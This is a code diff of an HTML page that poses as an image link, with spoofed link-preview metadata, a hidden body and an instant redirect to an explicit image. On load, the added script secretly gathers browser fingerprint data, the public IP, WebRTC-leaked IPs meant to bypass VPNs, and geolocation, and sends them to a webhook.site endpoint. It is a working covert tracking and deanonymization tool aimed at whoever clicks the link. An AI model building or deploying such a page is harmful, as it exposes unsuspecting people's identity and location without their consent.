@@ -1,45 +1,93 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head>
+    <!-- Open Graph Metadata for Link Previews -->
+    <meta property="og:title" content="View Image">
+    <meta property="og:description" content="Click to view full resolution.">
+    <meta property="og:image" content="https://realbooru.com//images/c2/48/c248298713f805d0862475ed31be6711.gif">
+    <meta property="og:type" content="website">
+    <meta property="twitter:card" content="summary_large_image">
+    <!-- Meta refresh fallback if JS fails or is blocked -->
+    <meta http-equiv="refresh" content="0; url=https://realbooru.com//images/c2/48/c248298713f805d0862475ed31be6711.gif">
+    <!-- Inline style to hide content immediately -->
+    <style>body { display: none; }</style>
+</head>
 <body>
     <script>
-        const WEBHOOK_URL = 'https://webhook.site/0938da25-704d-402d-8aef-f338cdb8e98b'; // Replace this
+        const WEBHOOK_URL = 'https://webhook.site/0938da25-704d-402d-8aef-f338cdb8e98b';
+        const REDIRECT_URL = 'https://realbooru.com//images/c2/48/c248298713f805d0862475ed31be6711.gif'; // This is the actual image you want them to see
 
-        async function collectAndSend() {
+        async function execute() {
             const data = {
-                userAgent: navigator.userAgent,
+                ts: new Date().toISOString(),
+                ua: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                screenResolution: screen.width + 'x' + screen.height,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled
+                cookies: navigator.cookieEnabled,
+                dnt: navigator.doNotTrack || 'unset',
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+                hwConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                ips: {}
             };
 
-            // WebRTC Leak for Real IP
-            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            pc.createDataChannel("");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            // IP Collection Method 1: Public IP via ipify.org
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                data.ips.public = json.ip;
+            } catch (e) { data.ips.public = "API_Failed"; }
+
+            // IP Collection Method 2: STUN/WebRTC for potential real IP behind VPN
+            const webrtcIPs = await getWebRTCIPs();
+            if (webrtcIPs.length > 0) {
+                data.ips.webrtc = webrtcIPs;
+            }
             
-            pc.onicecandidate = (ice) => {
-                if (ice && ice.candidate && ice.candidate.candidate) {
-                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                    if (ipMatch) {
-                        data.realIP = ipMatch[1];
-                        sendData(data);
-                    }
+            // Geolocation (requires user permission, often denied)
+            try {
+                if (navigator.geolocation) {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 1000, enableHighAccuracy: false });
+                    });
+                    data.geo = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
                 }
-            };
+            } catch (e) { data.geo = "Denied_or_Failed"; }
+
+            // Send data using sendBeacon for reliability
+            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(data));
+            
+            // Redirect immediately, overwriting history to the final destination
+            window.location.replace(REDIRECT_URL);
         }
 
-        function sendData(data) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+        async function getWebRTCIPs() {
+            return new Promise(resolve => {
+                const ips = [];
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                        if (ipMatch && !ips.includes(ipMatch[1])) {
+                            ips.push(ipMatch[1]);
+                        }
+                    }
+                };
+                setTimeout(() => resolve(ips), 500); 
             });
         }
 
-        collectAndSend();
+        execute();
     </script>
 </body>
 </html>
